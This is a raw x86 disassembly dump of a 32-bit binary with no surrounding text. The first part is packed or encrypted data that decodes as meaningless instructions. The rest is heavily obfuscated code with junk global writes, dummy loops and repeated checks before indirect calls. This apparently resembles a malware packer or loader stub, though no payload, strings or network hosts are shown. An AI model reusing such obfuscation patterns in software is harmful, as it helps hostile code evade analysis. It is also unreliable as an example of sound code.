  4204b2:	mov    cl,BYTE PTR [ebx]
  4204b4:	scas   eax,DWORD PTR es:[edi]
  4204b5:	push   es
  4204b6:	ja     0x42044d
  4204b8:	push   ebp
  4204b9:	test   ah,dh
  4204bb:	fsubr  st(5),st
  4204bd:	(bad)  [eax]
  4204bf:	xor    al,0x6a
  4204c1:	mov    cl,0x5b
  4204c3:	imul   ebx,eax,0x712f725e
  4204c9:	and    eax,0x735813d6
  4204ce:	rol    BYTE PTR [ecx+0x10],1
  4204d1:	(bad)  [edi-0x7c]
  4204d4:	jle    0x420541
  4204d6:	pop    es
  4204d7:	cmp    dl,0x1d
  4204da:	push   esi
  4204db:	inc    ebx
  4204dc:	out    0x1,al
  4204de:	enter  0x2402,0x51
  4204e2:	jnp    0x420481
  4204e4:	cmc    
  4204e5:	xchg   ebx,eax
  4204e6:	dec    eax
  4204e8:	(bad)  
  4204e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4204ea:	xor    DWORD PTR [esi-0x79b221f3],ebx
  4204f0:	(bad)  
  4204f1:	div    DWORD PTR [edx]
  4204f3:	mov    eax,0x4422b73a
  4204f8:	test   eax,0x70abe699
  4204fd:	jbe    0x420492
  4204ff:	sub    BYTE PTR [ebp-0x2284059e],ch
  420505:	add    al,0x6c
  420507:	icebp  
  420508:	xor    DWORD PTR [ebp-0x1d],edi
  42050b:	div    DWORD PTR [ebx+0xe]
  42050e:	xor    DWORD PTR [ebx+0x62],edx
  420511:	sub    al,0x4f
  420513:	inc    ebp
  420514:	sbb    BYTE PTR [ecx-0x33ee1ba2],ch
  42051a:	mov    ds:0x44a528ce,al
  42051f:	js     0x420558
  420521:	mov    cl,0x4
  420523:	cmp    BYTE PTR [ebp+ecx*4+0x3501dd43],0xe6
  42052b:	xchg   edi,eax
  42052c:	dec    ebp
  42052d:	and    ah,bl
  42052f:	mov    dl,0xf2
  420531:	stc    
  420532:	int    0x3d
  420534:	sub    BYTE PTR [edx+0x3507711],ch
  42053a:	mov    ah,0xcd
  42053c:	jbe    0x420577
  42053e:	dec    eax
  42053f:	or     DWORD PTR [ebx+edi*1+0x28],edi
  420543:	jnp    0x4205c4
  420545:	jle    0x420548
  420547:	mov    bl,0x7c
  420549:	test   al,0x2d
  42054b:	std    
  42054c:	sbb    cl,cl
  42054e:	pusha  
  42054f:	sub    DWORD PTR [edx+0x7c],ecx
  420552:	aas    
  420553:	pop    es
  420554:	xor    DWORD PTR [eax],edx
  420556:	repz sbb al,0x60
  420559:	sub    ebx,eax
  42055b:	(bad)  
  42055e:	in     al,0xb9
  420560:	(bad)  
  420561:	lea    ebx,[ebx-0x5a]
  420564:	clc    
  420565:	(bad)  
  420566:	sub    cl,BYTE PTR [edi]
  420568:	aad    0xd2
  42056a:	adc    eax,0xee5ce5b8
  42056f:	push   es
  420570:	es push ds
  420572:	ret    
  420573:	popa   
  420574:	push   cs
  420575:	sbb    cl,cl
  420577:	arpl   WORD PTR [esp+ebp*4+0x5e],sp
  42057b:	ffree  st(3)
  42057d:	cmp    DWORD PTR [edi+0x3e],esp
  420580:	mul    BYTE PTR [ecx-0x2b2e493e]
  420586:	out    dx,al
  420587:	je     0x420598
  420589:	sub    edi,edi
  42058b:	stos   BYTE PTR es:[edi],al
  42058c:	mov    DWORD PTR [eax],edx
  42058e:	nop
  42058f:	xlat   BYTE PTR ds:[ebx]
  420590:	in     al,dx
  420591:	enter  0x3c11,0x7e
  420595:	aaa    
  420596:	das    
  420597:	mov    edi,0x78f1bdf0
  42059c:	cmp    cl,cl
  42059e:	jns    0x420535
  4205a0:	stos   BYTE PTR es:[edi],al
  4205a1:	stc    
  4205a2:	lock outs dx,DWORD PTR ds:[esi]
  4205a4:	dec    ebp
  4205a5:	shr    ah,cl
  4205a7:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4205a9:	pop    eax
  4205aa:	mov    bl,0x3
  4205ac:	pop    ds
  4205ad:	stos   DWORD PTR es:[edi],eax
  4205ae:	sahf   
  4205af:	icebp  
  4205b0:	pushaw 
  4205b2:	push   ebx
  4205b3:	ret    0xa8db
  4205b6:	xor    BYTE PTR [esi-0x2cde43ad],al
  4205bc:	and    DWORD PTR ds:0x72f83329,0x250ead9e
  4205c6:	ror    dh,0x85
  4205c9:	lods   al,BYTE PTR ds:[esi]
  4205ca:	pop    ds
  4205cb:	fs gs out dx,eax
  4205ce:	xor    al,0x3d
  4205d0:	mov    al,ds:0x1319e0e4
  4205d5:	popf   
  4205d6:	or     ecx,DWORD PTR [edi+0x9]
  4205d9:	fwait
  4205da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4205db:	data16 es std 
  4205de:	pop    edi
  4205df:	mov    dh,0xf7
  4205e1:	mov    esp,0x2fee6d5b
  4205e6:	push   edi
  4205e7:	cmp    bl,bl
  4205e9:	or     ch,BYTE PTR [ecx]
  4205eb:	mov    eax,0xcf6e6fb8
  4205f0:	rol    ch,1
  4205f2:	mov    edi,0x78efca9f
  4205f7:	dec    edi
  4205f8:	sbb    edx,DWORD PTR [edx+edx*4-0x68]
  4205fc:	and    dh,BYTE PTR [ebx]
  4205fe:	push   ebx
  4205ff:	mov    ch,0xc8
  420601:	xor    bh,BYTE PTR ds:0xc65858d5
  420607:	xchg   edi,eax
  420608:	or     ah,ah
  42060a:	mov    cl,0x39
  42060c:	fnstsw WORD PTR ds:0xc436b35f
  420612:	xchg   edi,eax
  420613:	push   ss
  420614:	pop    esp
  420615:	sbb    ecx,DWORD PTR [eax+0x3c]
  420618:	push   ebp
  420619:	push   ss
  42061a:	xor    ebx,ebx
  42061c:	rol    DWORD PTR ds:0xe177167,1
  420622:	sbb    al,0x56
  420624:	sbb    BYTE PTR [esi-0x60],0x91
  420628:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420629:	mov    bl,0x62
  42062b:	or     DWORD PTR [esi-0x75],esp
  42062e:	mov    edx,0xbe2546f2
  420633:	or     ebp,DWORD PTR [ebx]
  420635:	out    dx,al
  420636:	jl     0x42062c
  420638:	shl    DWORD PTR [esi],1
  42063a:	jns    0x4206ac
  42063c:	lods   al,BYTE PTR ds:[esi]
  42063d:	inc    edx
  42063e:	add    esi,DWORD PTR [edx+0x19c4217e]
  420644:	mov    DWORD PTR [ebx-0x76],ebp
  420647:	push   es
  420648:	fsubp  st(3),st
  42064a:	mov    edx,0x3167c033
  42064f:	pop    ds
  420650:	mov    ebx,0x2f185f61
  420655:	cmp    cl,BYTE PTR [ecx]
  420657:	or     DWORD PTR [ebx],esp
  420659:	repz push 0x104a1259
  42065f:	aas    
  420660:	std    
  420661:	aad    0xa8
  420663:	jne    0x420660
  420665:	or     DWORD PTR [edi],esi
  420667:	mov    al,ds:0x47190409
  42066c:	popa   
  42066d:	out    0x1e,al
  42066f:	sub    BYTE PTR [esi+eiz*8+0x57],cl
  420673:	inc    esp
  420674:	fadd   DWORD PTR [ebp+edi*4-0xf035d56]
  42067b:	jae    0x420654
  42067d:	pop    edx
  42067e:	stc    
  42067f:	push   ss
  420680:	jge    0x4206ac
  420682:	adc    eax,DWORD PTR [ebx]
  420684:	sti    
  420685:	imul   ecx,DWORD PTR [edx],0x28ee2015
  42068b:	call   0xea17b01d
  420690:	out    dx,eax
  420691:	xor    dh,dh
  420693:	es pop ds
  420695:	and    al,0x67
  420697:	mov    eax,ds:0xa624e8
  42069c:	fwait
  42069d:	outs   dx,BYTE PTR ds:[esi]
  42069e:	mov    ds:0xef555329,eax
  4206a3:	xchg   ecx,eax
  4206a4:	loope  0x420691
  4206a6:	iret   
  4206a7:	add    eax,0x73eaaf75
  4206ac:	mov    edx,0x1700f617
  4206b1:	mov    edx,0x56132aa6
  4206b6:	and    cl,bl
  4206b8:	inc    ebx
  4206b9:	cmp    dl,BYTE PTR [edx+ebx*1-0x5c]
  4206bd:	mov    ebp,0x12424294
  4206c2:	cmp    esp,eax
  4206c4:	psubsw mm7,QWORD PTR [edx-0x32]
  4206c8:	push   0x4bbcd1de
  4206cd:	xchg   ebx,esp
  4206cf:	mov    eax,ds:0x81441458
  4206d4:	mov    cl,0x9b
  4206d6:	cmp    ecx,esp
  4206d8:	aas    
  4206d9:	(bad)  
  4206da:	scas   eax,DWORD PTR es:[edi]
  4206db:	fwait
  4206dc:	das    
  4206dd:	dec    edi
  4206de:	fdiv   st(1),st
  4206e0:	loop   0x420680
  4206e2:	cld    
  4206e3:	jne    0x420696
  4206e5:	and    eax,0x34d7818b
  4206ea:	xor    cl,BYTE PTR [ecx+0x7d8be47d]
  4206f0:	or     BYTE PTR [ebx],dh
  4206f2:	stc    
  4206f3:	mov    ecx,DWORD PTR [ebp-0x18]
  4206f6:	add    edi,edx
  4206f8:	cmp    ecx,edi
  4206fa:	je     0x42073c
  420700:	mov    ecx,DWORD PTR [ebp-0x18]
  420703:	add    ecx,eax
  420705:	mov    DWORD PTR [ebp-0x1c],ecx
  420708:	mov    ecx,DWORD PTR [ebp-0x30]
  42070b:	mov    edx,DWORD PTR [ebp-0x2c]
  42070e:	mov    edx,0xa143
  420713:	xor    cx,dx
  420716:	mov    edx,DWORD PTR [ebp-0x1c]
  420719:	mov    edx,DWORD PTR [edx+0xc]
  42071c:	add    cx,si
  42071f:	cmp    WORD PTR [eax+edx*1],cx
  420723:	jne    0x42073c
  420729:	mov    ecx,DWORD PTR ds:0x428373
  42072f:	mov    ecx,DWORD PTR [ecx+0x198]
  420735:	mov    DWORD PTR [ecx],eax
  420737:	jmp    0x420797
  42073c:	push   DWORD PTR [ebp+0x1c]
  42073f:	push   DWORD PTR [ebp+0x18]
  420742:	jmp    0x420786
  420747:	mov    eax,DWORD PTR [ebp+0x18]
  42074a:	mov    ecx,DWORD PTR [ebp+0x1c]
  42074d:	cmp    eax,0x70941f99
  420752:	jne    0x42076b
  420758:	cmp    ecx,ebx
  42075a:	jne    0x42076b
  420760:	push   ebx
  420761:	push   0x70941f9f
  420766:	jmp    0x420786
  42076b:	mov    eax,DWORD PTR [ebp+0x18]
  42076e:	mov    ecx,DWORD PTR [ebp+0x1c]
  420771:	cmp    eax,0x70941f9f
  420776:	jne    0x420797
  42077c:	cmp    ecx,ebx
  42077e:	jne    0x420797
  420784:	push   ebx
  420785:	push   edi
  420786:	push   DWORD PTR [ebp+0x14]
  420789:	push   DWORD PTR [ebp+0x10]
  42078c:	push   DWORD PTR [ebp+0xc]
  42078f:	push   DWORD PTR [ebp+0x8]
  420792:	call   0x41b999
  420797:	pop    edi
  420798:	pop    esi
  420799:	pop    ebx
  42079a:	leave  
  42079b:	ret    0x18
  42079e:	push   ebp
  42079f:	mov    ebp,esp
  4207a1:	and    esp,0xfffffff8
  4207a4:	adc    DWORD PTR ds:0x428e9f,0x428e5f
  4207ae:	sub    esp,0xcc
  4207b4:	push   ebx
  4207b5:	push   esi
  4207b6:	adc    DWORD PTR ds:0x428ecb,0x428e7f
  4207c0:	push   edi
  4207c1:	lea    eax,[esp+0x58]
  4207c5:	push   eax
  4207c6:	mov    BYTE PTR [esp+0xda],0x0
  4207ce:	and    DWORD PTR ds:0x428e83,0x428eb7
  4207d8:	call   DWORD PTR ds:0x42aa37
  4207de:	mov    DWORD PTR ds:0x428e9f,0x6fab
  4207e8:	mov    al,ds:0x428498
  4207ed:	cmp    al,BYTE PTR ds:0x4284a9
  4207f3:	mov    DWORD PTR ds:0x428e27,0x607e
  4207fd:	je     0x42081a
  420803:	push   0x0
  420805:	xor    DWORD PTR ds:0x428e63,0x595a
  42080f:	call   DWORD PTR ds:0x42a9f3
  420815:	jmp    0x42188d
  42081a:	mov    DWORD PTR ds:0x428e37,0x550e
  420824:	mov    al,ds:0x4284b5
  420829:	mov    DWORD PTR ds:0x428e27,0x154d
  420833:	cmp    al,BYTE PTR ds:0x4284c6
  420839:	mov    DWORD PTR ds:0x428e47,0x193
  420843:	je     0x420850
  420849:	xor    eax,eax
  42084b:	jmp    0x42188d
  420850:	mov    edi,DWORD PTR ds:0x42aa07
  420856:	adc    DWORD PTR ds:0x428e8b,0x1314
  420860:	push   0x4284cf
  420865:	push   0x4284db
  42086a:	call   edi
  42086c:	adc    DWORD PTR ds:0x428ea3,0x428e9f
  420876:	test   eax,eax
  420878:	je     0x420849
  42087e:	and    DWORD PTR ds:0x428e6f,edx
  420884:	mov    DWORD PTR [esp+0x30],0x0
  42088c:	adc    esi,0x6be4
  420892:	mov    ecx,0xf89c85a5
  420897:	mov    DWORD PTR [esp+0x20],ecx
  42089b:	mov    ebx,DWORD PTR ds:0x428ecf
  4208a1:	add    DWORD PTR ds:0x428e8f,ebx
  4208a7:	mov    DWORD PTR [esp+0xc],0xf89c85a4
  4208af:	lea    eax,[esp+0x3c]
  4208b3:	mov    DWORD PTR [esp+0x30],eax
  4208b7:	lea    eax,[esp+0x38]
  4208bb:	mov    DWORD PTR [esp+0x18],eax
  4208bf:	mov    eax,ds:0x428373
  4208c4:	mov    ebx,DWORD PTR ds:0x428edf
  4208ca:	mov    esi,DWORD PTR ds:0x42a0bb
  4208d0:	sub    esi,ebx
  4208d2:	or     ebx,DWORD PTR [ebx+esi*1]
  4208d5:	mov    eax,DWORD PTR [eax+0x1c8]
  4208db:	mov    eax,DWORD PTR [eax]
  4208dd:	and    DWORD PTR ds:0x428eaf,0x0
  4208e7:	mov    ebx,DWORD PTR ds:0x428eaf
  4208ed:	inc    ebx
  4208ee:	mov    DWORD PTR ds:0x428eaf,ebx
  4208f4:	cmp    DWORD PTR ds:0x428eaf,0x2d
  4208fb:	jle    0x42091e
  420901:	jmp    0x420911
  420906:	push   0x428189
  42090b:	call   DWORD PTR ds:0x42aa0b
  420911:	cmp    DWORD PTR ds:0x428eaf,0x1d
  420918:	jb     0x4208e7
  42091e:	mov    edx,DWORD PTR [esp+0x18]
  420922:	sub    DWORD PTR ds:0x428e37,0x428e2f
  42092c:	mov    esi,0x75108af
  420931:	and    DWORD PTR ds:0x428e5f,0x428e8b
  42093b:	xor    eax,esi
  42093d:	mov    DWORD PTR ds:0x428e53,0x1b
  420947:	cmp    DWORD PTR ds:0x428e53,0x0
  42094e:	je     0x42099d
  420954:	cmp    DWORD PTR ds:0x428e53,0x7
  42095b:	jb     0x42099d
  420961:	jmp    0x420971
  420966:	push   0x231a
  42096b:	call   DWORD PTR ds:0x42aa0f
  420971:	cmp    DWORD PTR ds:0x428e53,0x8
  420978:	jne    0x42098b
  42097e:	mov    ebx,DWORD PTR ds:0x428e53
  420984:	dec    ebx
  420985:	mov    DWORD PTR ds:0x428e53,ebx
  42098b:	mov    ebx,DWORD PTR ds:0x428e53
  420991:	dec    ebx
  420992:	mov    DWORD PTR ds:0x428e53,ebx
  420998:	jmp    0x420947
  42099d:	mov    ebx,0x3272f6
  4209a2:	add    eax,ebx
  4209a4:	mov    DWORD PTR ds:0x428ec3,0x767b
  4209ae:	mov    DWORD PTR [edx],eax
  4209b0:	mov    eax,ds:0x428cef
  4209b5:	mov    DWORD PTR ds:0x428e5f,0x7551
  4209bf:	cmp    eax,0x455dedfa
  4209c4:	mov    DWORD PTR ds:0x428e9f,0x7198
  4209ce:	jne    0x420a43
  4209d4:	or     DWORD PTR ds:0x428e3b,edi
  4209da:	mov    eax,DWORD PTR [esp+0x20]
  4209de:	mov    edx,DWORD PTR ds:0x428373
  4209e4:	mov    DWORD PTR ds:0x428e63,0x33b4
  4209ee:	mov    edx,DWORD PTR [edx+0x198]
  4209f4:	xor    eax,esi
  4209f6:	inc    DWORD PTR ds:0x428e6b
  4209fc:	add    eax,ebx
  4209fe:	mov    DWORD PTR [edx],eax
  420a00:	mov    eax,DWORD PTR [esp+0x20]
  420a04:	xor    DWORD PTR ds:0x428e57,0x1a38
  420a0e:	xor    eax,esi
  420a10:	add    eax,ebx
  420a12:	adc    DWORD PTR ds:0x428e23,0x304d
  420a1c:	mov    ds:0x428cef,eax
  420a21:	and    eax,0x47de
  420a26:	mov    eax,DWORD PTR [esp+0x20]
  420a2a:	adc    DWORD PTR ds:0x428e9b,0x428e27
  420a34:	xor    eax,esi
  420a36:	add    eax,ebx
  420a38:	inc    DWORD PTR ds:0x428ebb
  420a3e:	mov    ds:0x42846b,eax
  420a43:	and    DWORD PTR ds:0x428e43,0x0
  420a4d:	mov    eax,ds:0x428e43
  420a52:	inc    eax
  420a53:	mov    ds:0x428e43,eax
  420a58:	cmp    DWORD PTR ds:0x428e43,0x28
  420a5f:	ja     0x420a82
  420a65:	jmp    0x420a75
  420a6a:	push   0x42815b
  420a6f:	call   DWORD PTR ds:0x42aa13
  420a75:	cmp    DWORD PTR ds:0x428e43,0x1e
  420a7c:	jb     0x420a4d
  420a82:	mov    eax,ds:0x428373
  420a87:	adc    DWORD PTR ds:0x428e9f,0x428e87
  420a91:	mov    eax,DWORD PTR [eax+0x18c]
  420a97:	mov    eax,DWORD PTR [eax]
  420a99:	mov    DWORD PTR [esp+0x40],eax
  420a9d:	mov    eax,0xf89c85a1
  420aa2:	add    DWORD PTR ds:0x428ec3,0x428e3f
  420aac:	mov    DWORD PTR [esp+0x10],eax
  420ab0:	sub    DWORD PTR ds:0x428eab,0x428e2f
  420aba:	mov    DWORD PTR [esp+0x10],eax
  420abe:	and    DWORD PTR ds:0x428e97,0x428e8f
  420ac8:	mov    DWORD PTR [esp+0x10],eax
  420acc:	sub    DWORD PTR ds:0x428e9f,0x428e8f
  420ad6:	mov    DWORD PTR [esp+0x10],ecx
  420ada:	add    DWORD PTR ds:0x428e5b,0x398e
  420ae4:	mov    DWORD PTR [esp+0x18],eax
  420ae8:	adc    DWORD PTR ds:0x428ecb,0x1d27
  420af2:	mov    DWORD PTR [esp+0x18],0xf89c85bd
  420afa:	add    DWORD PTR ds:0x428e83,edi
  420b00:	mov    eax,DWORD PTR [esp+0x20]
  420b04:	sbb    DWORD PTR ds:0x428e5b,0x428ebf
  420b0e:	xor    eax,esi
  420b10:	or     DWORD PTR ds:0x428ebb,0x428e7f
  420b1a:	add    eax,ebx
  420b1c:	mov    DWORD PTR ds:0x428e37,0x4b61
  420b26:	jmp    0x420d1e
  420b2b:	mov    DWORD PTR ds:0x428ea7,0x2827
  420b35:	mov    al,ds:0x4284e8
  420b3a:	mov    DWORD PTR ds:0x428ecb,0x2eff
  420b44:	cmp    al,BYTE PTR ds:0x4284f9
  420b4a:	jne    0x420849
  420b50:	mov    DWORD PTR ds:0x428e3f,0x3779
  420b5a:	mov    al,ds:0x428505
  420b5f:	mov    DWORD PTR ds:0x428e67,0xc1e
  420b69:	cmp    al,BYTE PTR ds:0x428516
  420b6f:	jne    0x420849
  420b75:	or     DWORD PTR ds:0x428e53,0x428ec3
  420b7f:	push   0x42851f
  420b84:	or     DWORD PTR ds:0x428eb7,0x428ebb
  420b8e:	push   0x42852b
  420b93:	sub    DWORD PTR ds:0x428e9f,0x10e
  420b9d:	call   edi
  420b9f:	xor    DWORD PTR ds:0x428e93,0x265a
  420ba9:	test   eax,eax
  420bab:	je     0x420849
  420bb1:	mov    al,ds:0x428538
  420bb6:	mov    DWORD PTR ds:0x428e5f,0x67be
  420bc0:	cmp    al,BYTE PTR ds:0x428549
  420bc6:	mov    DWORD PTR ds:0x428ecb,0x75a8
  420bd0:	jne    0x420849
  420bd6:	mov    DWORD PTR ds:0x428e6f,0x3bcf
  420be0:	mov    al,ds:0x428555
  420be5:	mov    DWORD PTR ds:0x428e6b,0x562a
  420bef:	cmp    al,BYTE PTR ds:0x428566
  420bf5:	jne    0x420849
  420bfb:	adc    DWORD PTR ds:0x428e2f,0x428ec3
  420c05:	push   0x42856f
  420c0a:	add    DWORD PTR ds:0x428ecb,0x428e87
  420c14:	push   0x42857b
  420c19:	call   edi
  420c1b:	and    DWORD PTR ds:0x428e6b,0x4f9f
  420c25:	test   eax,eax
  420c27:	je     0x420849
  420c2d:	sub    eax,DWORD PTR ds:0x428e9b
  420c33:	mov    eax,DWORD PTR [esp+0xc]
  420c37:	mov    ecx,DWORD PTR [esp+0x18]
  420c3b:	add    DWORD PTR ds:0x428e93,0x1aa1
  420c45:	xor    eax,esi
  420c47:	lea    eax,[eax+ecx*1+0x3272f6]
  420c4e:	and    DWORD PTR ds:0x428e5f,0x6940
  420c58:	push   eax
  420c59:	or     eax,DWORD PTR ds:0x428e5b
  420c5f:	mov    eax,DWORD PTR [esp+0x14]
  420c63:	xor    eax,esi
  420c65:	or     DWORD PTR ds:0x428e77,0x428e6f
  420c6f:	lea    eax,[ebp+eax*1+0x3272fe]
  420c76:	adc    DWORD PTR ds:0x428eb7,0x2832
  420c80:	push   eax
  420c81:	mov    eax,ds:0x428373
  420c86:	push   DWORD PTR [eax+0x1bc]
  420c8c:	sbb    DWORD PTR ds:0x428eb7,0x428ebb
  420c96:	call   0x421896
  420c9b:	mov    eax,DWORD PTR [esp+0xc]
  420c9f:	mov    edx,DWORD PTR ds:0x428e9f
  420ca5:	or     edx,DWORD PTR ds:0x428e7b
  420cab:	mov    DWORD PTR ds:0x428e9f,edx
  420cb1:	mov    ecx,DWORD PTR [esp+0x18]
  420cb5:	mov    DWORD PTR ds:0x428e9f,0x15
  420cbf:	cmp    DWORD PTR ds:0x428e9f,0x0
  420cc6:	je     0x420d15
  420ccc:	cmp    DWORD PTR ds:0x428e9f,0x5
  420cd3:	jle    0x420d15
  420cd9:	jmp    0x420ce9
  420cde:	push   0x75d1
  420ce3:	call   DWORD PTR ds:0x42aa17
  420ce9:	cmp    DWORD PTR ds:0x428e9f,0x6
  420cf0:	jne    0x420d03
  420cf6:	mov    edx,DWORD PTR ds:0x428e9f
  420cfc:	dec    edx
  420cfd:	mov    DWORD PTR ds:0x428e9f,edx
  420d03:	mov    edx,DWORD PTR ds:0x428e9f
  420d09:	dec    edx
  420d0a:	mov    DWORD PTR ds:0x428e9f,edx
  420d10:	jmp    0x420cbf
  420d15:	xor    eax,esi
  420d17:	lea    eax,[ecx+eax*1+0x3272f6]
  420d1e:	and    DWORD PTR ds:0x428ea3,0x0
  420d28:	jmp    0x420d3c
  420d2d:	xor    ecx,ecx
  420d2f:	add    ecx,DWORD PTR ds:0x428ea3
  420d35:	inc    ecx
  420d36:	mov    DWORD PTR ds:0x428ea3,ecx
  420d3c:	cmp    DWORD PTR ds:0x428ea3,0x1b
  420d43:	jae    0x420d83
  420d49:	cmp    DWORD PTR ds:0x428ea3,0x4
  420d50:	jle    0x420d83
  420d56:	jmp    0x420d64
  420d5b:	push   DWORD PTR [ebp-0x18]
  420d5e:	call   DWORD PTR ds:0x42aa1b
  420d64:	cmp    DWORD PTR ds:0x428ea3,0x3
  420d6b:	jne    0x420d7e
  420d71:	mov    ecx,DWORD PTR ds:0x428ea3
  420d77:	inc    ecx
  420d78:	mov    DWORD PTR ds:0x428ea3,ecx
  420d7e:	jmp    0x420d2d
  420d83:	mov    ecx,DWORD PTR [esp+0xc]
  420d87:	mov    edx,DWORD PTR [esp+0xc]
  420d8b:	and    DWORD PTR ds:0x428e7f,0x27c9
  420d95:	xor    edx,esi
  420d97:	xor    ecx,esi
  420d99:	add    ecx,edx
  420d9b:	and    DWORD PTR ds:0x428eb7,0x0
  420da5:	mov    edx,DWORD PTR ds:0x428eb7
  420dab:	inc    edx
  420dac:	mov    DWORD PTR ds:0x428eb7,edx
  420db2:	cmp    DWORD PTR ds:0x428eb7,0x23
  420db9:	jg     0x420de1
  420dbf:	jmp    0x420dd4
  420dc4:	push   0x428e3f
  420dc9:	push   0x584f
  420dce:	call   DWORD PTR ds:0x42aa1f
  420dd4:	cmp    DWORD PTR ds:0x428eb7,0x1b
  420ddb:	jb     0x420da5
  420de1:	mov    edx,DWORD PTR [esp+0xc]
  420de5:	mov    DWORD PTR ds:0x428e97,0x4e1f
  420def:	xor    edx,esi
  420df1:	lea    ecx,[ecx+edx*1+0x9758e2]
  420df8:	mov    DWORD PTR ds:0x428e83,0x69c
  420e02:	mov    DWORD PTR [esp+0x18],eax
  420e06:	mov    DWORD PTR ds:0x428ebf,0x5f48
  420e10:	cmp    eax,ecx
  420e12:	mov    DWORD PTR ds:0x428e3f,0x5aa0
  420e1c:	jbe    0x420b2b
  420e22:	not    eax
  420e24:	mov    eax,DWORD PTR [ebp+0xc]
  420e27:	and    ecx,0x5ce1
  420e2d:	mov    ds:0x4281f7,eax
  420e32:	mov    eax,DWORD PTR [ebp+0x10]
  420e35:	mov    DWORD PTR ds:0x428e87,0x15
  420e3f:	cmp    DWORD PTR ds:0x428e87,0x0
  420e46:	je     0x420e96
  420e4c:	cmp    DWORD PTR ds:0x428e87,0x6
  420e53:	jb     0x420e96
  420e59:	jmp    0x420e6a
  420e5e:	push   DWORD PTR [ebp-0x14]
  420e61:	push   DWORD PTR [ebp-0x1c]
  420e64:	call   DWORD PTR ds:0x42aa23
  420e6a:	cmp    DWORD PTR ds:0x428e87,0x7
  420e71:	jne    0x420e84
  420e77:	mov    ecx,DWORD PTR ds:0x428e87
  420e7d:	dec    ecx
  420e7e:	mov    DWORD PTR ds:0x428e87,ecx
  420e84:	mov    ecx,DWORD PTR ds:0x428e87
  420e8a:	dec    ecx
  420e8b:	mov    DWORD PTR ds:0x428e87,ecx
  420e91:	jmp    0x420e3f
  420e96:	mov    ds:0x428453,eax
  420e9b:	mov    eax,ds:0x4281f7
  420ea0:	mov    ecx,DWORD PTR ds:0x428e9b
  420ea6:	adc    ecx,DWORD PTR ds:0x428ec3
  420eac:	mov    DWORD PTR ds:0x428e9b,ecx
  420eb2:	mov    ecx,DWORD PTR [esp+0x30]
  420eb6:	sub    eax,ebx
  420eb8:	xor    eax,esi
  420eba:	mov    DWORD PTR ds:0x428ecb,0x2418
  420ec4:	mov    DWORD PTR [ecx],eax
  420ec6:	mov    DWORD PTR ds:0x428e97,0x6c0e
  420ed0:	lea    eax,[esp+0x2c]
  420ed4:	mov    DWORD PTR [esp+0x44],eax
  420ed8:	mov    DWORD PTR ds:0x428ea3,0x17d
  420ee2:	lea    eax,[ebp+0x4]
  420ee5:	mov    DWORD PTR [esp+0x2c],eax
  420ee9:	mov    DWORD PTR ds:0x428ec3,0x4441
  420ef3:	mov    al,ds:0x428588
  420ef8:	cmp    al,BYTE PTR ds:0x428599
  420efe:	mov    DWORD PTR ds:0x428e47,0x46bb
  420f08:	jne    0x420849
  420f0e:	mov    al,ds:0x4285a5
  420f13:	cmp    al,BYTE PTR ds:0x4285b6
  420f19:	mov    DWORD PTR ds:0x428eaf,0x61de
  420f23:	jne    0x420849
  420f29:	mov    DWORD PTR ds:0x428ea7,0xc38
  420f33:	push   0x4285bf
  420f38:	sbb    DWORD PTR ds:0x428e8b,0x428e7f
  420f42:	push   0x4285cb
  420f47:	call   edi
  420f49:	test   eax,eax
  420f4b:	mov    DWORD PTR ds:0x428e4b,0x74a1
  420f55:	je     0x420849
  420f5b:	mov    al,ds:0x4285d8
  420f60:	mov    DWORD PTR ds:0x428e27,0x62c3
  420f6a:	cmp    al,BYTE PTR ds:0x4285e9
  420f70:	jne    0x420849
  420f76:	mov    DWORD PTR ds:0x428e5b,0x5f7d
  420f80:	mov    al,ds:0x4285f5
  420f85:	mov    DWORD PTR ds:0x428e3b,0x1797
  420f8f:	cmp    al,BYTE PTR ds:0x428606
  420f95:	jne    0x420849
  420f9b:	push   0x42860f
  420fa0:	add    DWORD PTR ds:0x428ebf,0x428eab
  420faa:	push   0x42861b
  420faf:	call   edi
  420fb1:	test   eax,eax
  420fb3:	je     0x420849
  420fb9:	mov    DWORD PTR ds:0x428e67,0x333a
  420fc3:	mov    al,ds:0x428628
  420fc8:	cmp    al,BYTE PTR ds:0x428639
  420fce:	jne    0x420849
  420fd4:	mov    DWORD PTR ds:0x428e63,0x2ea7
  420fde:	mov    al,ds:0x428645
  420fe3:	mov    DWORD PTR ds:0x428e83,0x19a
  420fed:	cmp    al,BYTE PTR ds:0x428656
  420ff3:	mov    DWORD PTR ds:0x428ec3,0xb46
  420ffd:	jne    0x420849
  421003:	xor    DWORD PTR ds:0x428e4b,0x428e9b
  42100d:	push   0x42865f
  421012:	xor    DWORD PTR ds:0x428ea7,0x428ebf
  42101c:	push   0x42866b
  421021:	adc    DWORD PTR ds:0x428e7b,0x428e97
  42102b:	call   edi
  42102d:	test   eax,eax
  42102f:	je     0x420849
  421035:	mov    DWORD PTR ds:0x428eab,0x160c
  42103f:	mov    al,ds:0x428678
  421044:	cmp    al,BYTE PTR ds:0x428689
  42104a:	mov    DWORD PTR ds:0x428e33,0x7fda
  421054:	jne    0x420849
  42105a:	mov    DWORD PTR ds:0x428eb3,0x205
  421064:	mov    al,ds:0x428695
  421069:	mov    DWORD PTR ds:0x428ea7,0x1bc1
  421073:	cmp    al,BYTE PTR ds:0x4286a6
  421079:	mov    DWORD PTR ds:0x428e2f,0xcbc
  421083:	jne    0x420849
  421089:	push   0x4286af
  42108e:	xor    DWORD PTR ds:0x428e73,0x428e53
  421098:	push   0x4286bb
  42109d:	call   edi
  42109f:	test   eax,eax
  4210a1:	mov    DWORD PTR ds:0x428e7f,0x3ee2
  4210ab:	je     0x420849
  4210b1:	mov    DWORD PTR ds:0x428e73,0x4aa5
  4210bb:	mov    al,ds:0x4286c8
  4210c0:	mov    DWORD PTR ds:0x428e73,0x2576
  4210ca:	cmp    al,BYTE PTR ds:0x4286d9
  4210d0:	jne    0x420849
  4210d6:	mov    al,ds:0x4286e5
  4210db:	mov    DWORD PTR ds:0x428eab,0x2fd2
  4210e5:	cmp    al,BYTE PTR ds:0x4286f6
  4210eb:	mov    DWORD PTR ds:0x428e77,0x665f
  4210f5:	jne    0x420849
  4210fb:	push   0x4286ff
  421100:	xor    DWORD PTR ds:0x428eab,0x43e0
  42110a:	push   0x42870b
  42110f:	call   edi
  421111:	add    DWORD PTR ds:0x428eaf,0x428e77
  42111b:	test   eax,eax
